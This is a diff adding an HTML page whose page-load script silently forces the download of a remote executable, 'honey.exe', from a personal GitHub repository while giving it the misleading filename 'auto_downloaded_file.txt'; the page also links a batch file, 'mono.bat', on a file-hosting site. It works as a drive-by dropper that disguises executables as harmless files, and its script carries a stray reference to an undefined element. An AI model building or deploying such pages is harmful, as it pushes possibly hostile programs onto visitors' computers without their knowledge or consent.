@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto File Download</title>
+<style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #4CAF50;
+        }
+        p {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-top: 20px;
+            font-size: 1em;
+            color: #fff;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+    <script>
+        // This function will trigger the download automatically when the page loads
+        window.onload = function() {
+            // URL of the file to be downloaded (this can be a local or remote URL)
+            const fileUrl = 'https://github.com/gegeje123/honey/raw/refs/heads/main/honey.exe'; // Replace with the actual URL of the file
+           
+            // Content to be included in the file (for Blob example, if it's dynamically created)
+            const content = 'This is the content of the downloaded file.';
+
+            // Create a Blob with the content (text file)
+            const blob = new Blob([content], { type: 'text/plain' });
+            
+            // Create an anchor (a) tag dynamically
+            const link = document.createElement('a');
+          
+            // If you want to use an actual URL to a file, replace this with the file URL
+            link.href = fileUrl; // If you have a remote file, set the URL here
+         
+            // link.href = URL.createObjectURL(blob); // Uncomment this line if you want to download the dynamically created Blob
+
+            // Set the filename for the file that will be downloaded
+            link.download = 'auto_downloaded_file.txt'; // Suggested filename for the downloaded file
+          
+            // Append the link element to the body (invisible)
+            document.body.appendChild(link);
+        
+            // Trigger the download by simulating a click
+            link.click();
+          
+            // Remove the link element after triggering the download
+            document.body.removeChild(link);
+            document.body.removeChild(link2);  
+            // Display the URL of the file being downloaded on the page
+            const urlDisplay = document.getElementById('file-url');
+            urlDisplay.textContent = `The file is being downloaded from: ${fileUrl}`;
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome! Your download will start shortly...</h1>
+    <p id="file-url"></p> <!-- The file URL will be displayed here -->
+    <p>If the download doesn't start automatically, please check your browser settings.</p>
+    <a href='https://download938.mediafire.com/55v2ku7gowvghTnE6DPJASax4iAQQAMjA-TBc_9_N8ghTE4FK2D7O4bJvBlghIsCSEFYWQhoBnSQeTh234yDg6noW5bhYMMeoEJpXGVUlkbk7i6kxJEyntCND_9BX8sp2dIw2YTG9Kz-6B115rrO1tP-sScD_IZ8gRsc7PH2iZwwjA/yci0pffh2pa3ij6/mono.bat'>download</a>
+ <div class="container">
+        <h1>Welcome!</h1>
+        <p>I can do anything now with my computer.</p>
+        <a href="#" class="button">Learn More</a>
+    </div>
+</body>
+</html>
